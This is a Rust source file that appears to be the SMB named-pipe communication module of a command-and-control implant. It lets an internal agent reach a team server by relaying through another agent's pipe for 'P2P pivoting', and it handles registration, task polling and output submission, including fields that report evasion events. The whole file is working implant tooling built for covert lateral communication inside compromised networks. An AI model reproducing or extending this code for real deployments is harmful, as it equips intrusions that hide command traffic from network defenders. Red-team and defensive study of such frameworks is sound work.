//! SMB named-pipe channel — agent communicates through a Windows named pipe.
//!
//! Used for P2P pivoting: an internal agent connects to a relay agent's pipe
//! instead of reaching the internet directly. The relay agent forwards traffic
//! to the team server over its own HTTPS channel.
//!
//! Pipe path format: \\{host}\pipe\{name}
//! Local shorthand:  \\.\pipe\{name}
//!
//! Protocol: same 4-byte LE length prefix + JSON envelope as the TCP channel.

use std::ffi::CString;

use windows_sys::Win32::Foundation::{CloseHandle, GENERIC_READ, GENERIC_WRITE, HANDLE, INVALID_HANDLE_VALUE};
use windows_sys::Win32::Storage::FileSystem::{
    CreateFileA, ReadFile, WriteFile, FILE_ATTRIBUTE_NORMAL, OPEN_EXISTING,
};

use super::{Channel, ChannelError};
use crate::task::{PollResponse, RegisterRequest, RegisterResponse, TaskOutputRequest};

pub struct SmbChannel {
    pipe_path: CString,
}

impl SmbChannel {
    pub fn new(host: &str, pipe_name: &str) -> Self {
        // Validate that neither argument contains interior null bytes before building
        // the pipe path. CString::new rejects interior nulls; an empty fallback would
        // silently open the wrong pipe so we assert instead.
        assert!(!host.contains('\0') && !pipe_name.contains('\0'),
            "SmbChannel: host/pipe_name must not contain null bytes");
        let path = format!("\\\\{}\\pipe\\{}", host, pipe_name);
        let pipe_path = CString::new(path).expect("SmbChannel: path contains null bytes");
        Self { pipe_path }
    }

    fn open_pipe(&self) -> Result<HANDLE, ChannelError> {
        let h = unsafe {
            CreateFileA(
                self.pipe_path.as_ptr() as *const u8,
                GENERIC_READ | GENERIC_WRITE,
                0,
                std::ptr::null(),
                OPEN_EXISTING,
                FILE_ATTRIBUTE_NORMAL,
                0,
            )
        };
        if h == INVALID_HANDLE_VALUE {
            return Err(ChannelError::Network("CreateFileA failed".into()));
        }
        Ok(h)
    }

    fn send_recv(&self, data: &[u8]) -> Result<Vec<u8>, ChannelError> {
        let h = self.open_pipe()?;

        let len_bytes = (data.len() as u32).to_le_bytes();
        if !pipe_write(h, &len_bytes) || !pipe_write(h, data) {
            unsafe { CloseHandle(h); }
            return Err(ChannelError::Network("pipe write failed".into()));
        }

        let mut rlen_buf = [0u8; 4];
        if !pipe_read(h, &mut rlen_buf) {
            unsafe { CloseHandle(h); }
            return Err(ChannelError::Network("pipe read len failed".into()));
        }
        let rlen = u32::from_le_bytes(rlen_buf) as usize;
        if rlen > 32 * 1024 * 1024 {
            unsafe { CloseHandle(h); }
            return Err(ChannelError::Parse("response too large".into()));
        }
        let mut rbuf = vec![0u8; rlen];
        if !pipe_read(h, &mut rbuf) {
            unsafe { CloseHandle(h); }
            return Err(ChannelError::Network("pipe read body failed".into()));
        }

        unsafe { CloseHandle(h); }
        Ok(rbuf)
    }
}

impl Channel for SmbChannel {
    fn register(
        &mut self,
        req: &RegisterRequest,
        _path: &str,
    ) -> Result<RegisterResponse, ChannelError> {
        let body = serde_json::to_vec(req)
            .map_err(|e| ChannelError::Parse(e.to_string()))?;
        let env = wrap_smb_envelope("register", &body)?;
        let resp = self.send_recv(&env)?;
        serde_json::from_slice(&resp).map_err(|e| ChannelError::Parse(e.to_string()))
    }

    fn poll(
        &mut self,
        session: &crate::Session,
        _path: &str,
    ) -> Result<PollResponse, ChannelError> {
        let body = serde_json::to_vec(&serde_json::json!({"session_id": session.id}))
            .map_err(|e| ChannelError::Parse(e.to_string()))?;
        let env = wrap_smb_envelope("poll", &body)?;
        let resp = self.send_recv(&env)?;
        serde_json::from_slice(&resp).map_err(|e| ChannelError::Parse(e.to_string()))
    }

    fn submit_output(
        &mut self,
        session:             &crate::Session,
        _path:               &str,
        task_id:             &str,
        output:              Vec<u8>,
        success:             bool,
        evasion_event:       bool,
        evasion_description: String,
    ) -> Result<(), ChannelError> {
        let req = TaskOutputRequest {
            session_id: session.id.clone(),
            task_id: task_id.to_string(),
            output,
            success,
            evasion_event,
            evasion_description,
        };
        let body = serde_json::to_vec(&req)
            .map_err(|e| ChannelError::Parse(e.to_string()))?;
        let env = wrap_smb_envelope("submit", &body)?;
        self.send_recv(&env)?;
        Ok(())
    }
}

fn wrap_smb_envelope(msg_type: &str, body: &[u8]) -> Result<Vec<u8>, ChannelError> {
    let raw = serde_json::json!({
        "type": msg_type,
        "body": serde_json::from_slice::<serde_json::Value>(body)
            .map_err(|e| ChannelError::Parse(e.to_string()))?,
    });
    serde_json::to_vec(&raw).map_err(|e| ChannelError::Parse(e.to_string()))
}

fn pipe_write(h: HANDLE, data: &[u8]) -> bool {
    let mut written = 0u32;
    unsafe {
        WriteFile(h, data.as_ptr(), data.len() as u32, &mut written, std::ptr::null_mut()) != 0
            && written as usize == data.len()
    }
}

fn pipe_read(h: HANDLE, buf: &mut [u8]) -> bool {
    let mut read = 0u32;
    let mut total = 0usize;
    while total < buf.len() {
        let ok = unsafe {
            ReadFile(
                h,
                buf.as_mut_ptr().add(total),
                (buf.len() - total) as u32,
                &mut read,
                std::ptr::null_mut(),
            )
        };
        if ok == 0 || read == 0 {
            return false;
        }
        total += read as usize;
    }
    true
}
